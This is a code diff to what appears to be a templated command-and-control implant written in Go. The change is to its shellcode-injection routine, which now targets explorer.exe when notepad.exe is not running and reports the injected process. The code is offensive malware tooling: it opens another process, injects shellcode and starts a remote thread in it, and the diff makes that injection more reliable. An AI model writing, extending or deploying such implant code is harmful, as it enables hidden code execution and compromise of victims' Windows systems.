@@ -731,10 +731,17 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}(shellcode []byte) st
 		return "[ERROR] Process injection only supported on Windows"
 	}
 
-	// Get target process ID (notepad.exe)
+	// Get target process ID (try notepad.exe first, then explorer.exe as fallback)
 	pid, err := a.{AGENT_GET_PROCESS_ID_FUNC}("notepad")
+	targetProcess := "notepad.exe"
+
 	if err != nil {
-		return fmt.Sprintf("[ERROR] Could not find notepad.exe: %v", err)
+		// If notepad.exe is not available, try explorer.exe
+		pid, err = a.{AGENT_GET_PROCESS_ID_FUNC}("explorer")
+		if err != nil {
+			return fmt.Sprintf("[ERROR] Could not find notepad.exe or explorer.exe: %v", err)
+		}
+		targetProcess = "explorer.exe"
 	}
 
 	// Open the target process with all necessary permissions
@@ -770,7 +777,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}(shellcode []byte) st
 		return "[ERROR] Failed to create remote thread in target process"
 	}
 
-	return fmt.Sprintf("[SUCCESS] Shellcode injected into notepad.exe (PID: %d), thread ID: %d", pid, threadID)
+	return fmt.Sprintf("[SUCCESS] Shellcode injected into %s (PID: %d), thread ID: %d", targetProcess, pid, threadID)
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) string {
